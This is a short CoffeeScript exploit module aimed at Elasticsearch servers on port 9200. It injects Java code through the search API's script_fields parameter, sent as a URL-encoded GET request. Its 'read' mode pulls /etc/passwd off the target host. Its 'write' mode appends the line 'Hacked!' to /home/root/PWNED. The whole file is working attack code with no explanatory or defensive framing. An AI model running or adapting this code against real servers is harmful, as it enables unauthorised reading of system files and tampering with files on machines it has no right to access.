get = require "./get"

module.exports = (host, type, port) ->
  port ?= 9200

  read = (filename) ->
    return ("import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"" + filename + "\")).useDelimiter(\"\\\\Z\").next();")
  write = (filename, data) ->
    return ("import java.util.*;\nimport java.io.*;\nPrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(\"" + filename + "\", true)));\nwriter.println(\"" + data + "\");\nwriter.close();")


  fileRead = ["/etc/passwd"]
  fileWrite = "/home/root/PWNED"

  payload =
    size: 1
    query:
      filtered:
        query:
          match_all: {}
    script_fields: {}




  if type == "read"
    for filename in fileRead
      payload["script_fields"][filename] = {"script": read filename }
    encoded = encodeURIComponent JSON.stringify payload
    encodedUrl = "http://#{host}:#{port}/_search?source=#{encoded}&callback=?"
    console.log "UUL:", "\n", encodedUrl, "\n"
    console.log "data: \n", "\n"
    get encodedUrl, (data) ->
      console.log data

  if type == "write"
    content = "Hacked!"
    payload["script_fields"][fileWrite] = {"script": write fileWrite, content }
    encoded = encodeURIComponent JSON.stringify payload
    encodedUrl = "http://#{host}:#{port}/_search?source=#{encoded}&callback=?"
    console.log encodedUrl
    console.log "data: \n", "\n"
    get encodedUrl, (data) ->
      console.log data
